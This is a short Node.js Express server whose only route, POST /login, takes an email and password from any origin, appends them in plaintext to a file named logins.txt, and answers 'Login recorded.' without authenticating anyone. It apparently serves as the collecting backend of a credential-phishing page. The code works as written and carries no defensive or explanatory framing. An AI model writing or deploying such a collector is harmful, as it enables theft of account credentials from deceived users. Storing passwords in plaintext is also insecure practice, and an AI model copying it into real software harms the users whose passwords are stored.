const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const log = `Email: ${email}, Password: ${password}\n`;

  fs.appendFile('logins.txt', log, (err) => {
    if (err) return res.status(500).send('Error saving data.');
    res.send('Login recorded.');
  });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
